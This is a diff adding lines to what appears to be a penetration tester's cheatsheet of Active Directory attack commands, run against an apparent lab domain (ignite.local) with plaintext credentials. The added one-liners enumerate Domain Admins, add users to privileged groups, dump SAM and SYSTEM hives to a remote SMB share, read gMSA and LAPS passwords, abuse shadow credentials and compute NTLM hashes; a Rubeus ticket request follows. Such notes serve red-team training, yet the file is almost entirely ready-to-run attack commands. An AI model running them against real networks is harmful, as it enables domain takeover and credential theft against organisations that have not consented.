@@ -1,5 +1,17 @@
 # CHEATSHEETS
 
+net rpc group members "Domain Admins" -U ignite.local/shreya%'Password@1' -S 192.168.1.48		# List users in Group
+ldap_shell ignite.local/shreya:Password@1 -dc-ip 192.168.1.48		# AddSelf	# add_user_to_group <user> <Group>
+Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose	# Addself # PowerView
+python3 addusertogroup.py -d ignite.local -g "Backup Operators" -a aarav -u aarav -p Password@1		# AddSelf
+impacket-reg "ignite.local"/"aarav":"Password@1"@"192.168.1.48" backup -o '\\192.168.1.40\share'	#  dump the SAM and SYSTEM hives from the target machine
+python3 gMSADumper.py -u komal -p Password@1 -d ignite.local -l 192.168.1.48		# read the GMSA password of the account this ACE (ReadGMSAPassword)
+ldap_shell ignite.local/komal:Password@1 -dc-ip 192.168.1.48		# get_laps_gmsa
+Invoke-GMSAPasswordReader -Command "--AccountName MyGMSA"	# https://github.com/ricardojba/Invoke-GMSAPasswordReader
+ldap_shell ignite.local/krishna:Password@1 -dc-ip 192.168.1.58		# get_ntlm <user> # Shadow credentials | msds-KeyCredentialLink | instead pywhisker
+python -c "import hashlib;hash=hashlib.new('md4', '1loggbz'.encode('utf-16le')).digest().hex(); print(hash)"		# generate NTLM hash from clear text password
+
+
 # RUBEUS
 
 ﻿rubeus.exe asktgt /user:livestep /password:Password@1		# pedido de um Ticket Granting Ticket (TGT) ao KDC
